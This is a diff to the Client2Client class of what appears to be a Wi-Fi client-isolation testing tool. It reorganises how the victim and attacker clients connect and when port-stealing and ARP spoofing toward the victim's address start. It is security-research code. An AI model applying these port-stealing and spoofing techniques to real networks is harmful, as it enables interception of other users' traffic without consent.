@@ -944,19 +944,11 @@ class Client2Client:
 		self.sup_attacker.event_loop()
 
 	def run(self):
-		# Start both clients
+		# If not in PoC mode, let victim client connect.
 		if not self.options.poc:
 			self.sup_victim.start()
-		
-		if not self.options.poc:
 			self.sup_victim.scan(wait=False)
-
-		if not self.options.poc:
 			self.sup_victim.wait_scan_done()
-		
-
-		# Let both client connects
-		if not self.options.poc:
 			log(STATUS, f"Connecting as {self.sup_victim.id_victim} using {self.sup_victim.nic_iface} to the network...", color="green")
 			self.sup_victim.connect(self.sup_victim.netid_victim, timeout=60)
 			data = self.sup_victim.status()
@@ -967,8 +959,9 @@ class Client2Client:
 		if self.options.c2c_port_steal_uplink is not None:
 			set_macaddress(self.options.c2c, self.sup_victim.routermac)
 			self.sup_attacker = Supplicant(self.options.c2c, self.options)
-		if self.options.c2c_port_steal is None:
-			self.attacker_connect()
+
+		self.attacker_connect()
+
 		self.check_gtk_shared()
 
 		# [ Send a packet from the attacker to the victim ]
@@ -993,9 +986,8 @@ class Client2Client:
 			thread2.start()
 		thread1.start()
 		if self.options.c2c_port_steal is not None or self.options.c2c_port_steal_uplink is not None:
-			if self.options.c2c_port_steal is not None:
-                        	self.attacker_connect()
 			thread4.start()
+			
 		if not self.options.poc:
 			if self.options.c2c_port_steal is not None or self.options.c2c_port_steal_uplink is not None:
 				thread3.start()
@@ -1055,7 +1047,7 @@ class Client2Client:
                 # Let the attacker get an IP address, also
                 if self.options.c2c_port_steal_uplink is None and self.options.c2c_port_steal is None:
                         self.sup_attacker.get_ip_address()
-                elif self.options.c2c_port_steal is not None and not self.options.poc:
+                elif self.options.c2c_port_steal is not None: 
                         self.sup_attacker.arp_sock = ARP_sock(sock=self.sup_attacker.sock_eth, IP_addr=self.sup_victim.clientip, ARP_addr=self.sup_attacker.mac)
                         self.sup_attacker.can_send_traffic = True
                 self.attacker_connected = True
